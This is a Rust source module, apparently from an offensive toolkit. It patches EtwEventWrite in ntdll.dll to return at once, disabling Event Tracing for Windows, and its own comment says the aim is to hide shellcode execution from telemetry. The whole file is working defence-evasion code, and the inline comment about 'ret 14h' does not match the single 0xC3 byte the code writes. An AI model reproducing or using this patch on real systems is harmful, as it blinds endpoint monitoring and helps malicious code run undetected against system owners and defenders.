//! ETW (Event Tracing for Windows) bypass.
//!
//! Patches EtwEventWrite in ntdll.dll to return immediately (ret 14h),
//! suppressing telemetry events that would reveal shellcode execution.

#[cfg(target_os = "windows")]
pub fn patch() {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows_sys::Win32::System::Memory::VirtualProtect;
    use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;

    unsafe {
        let ntdll = GetModuleHandleA(c"ntdll.dll".as_ptr() as _);
        if ntdll == 0 { return; }

        let etw_fn = GetProcAddress(ntdll, c"EtwEventWrite".as_ptr() as _);
        if etw_fn.is_none() { return; }

        let addr = etw_fn.unwrap() as *mut u8;
        let mut old = 0u32;

        VirtualProtect(addr as _, 1, PAGE_EXECUTE_READWRITE, &mut old);
        // `ret 14h` on x64 — returns immediately, skipping the event write
        addr.write(0xC3);
        VirtualProtect(addr as _, 1, old, &mut old);
    }
}

#[cfg(not(target_os = "windows"))]
pub fn patch() {}
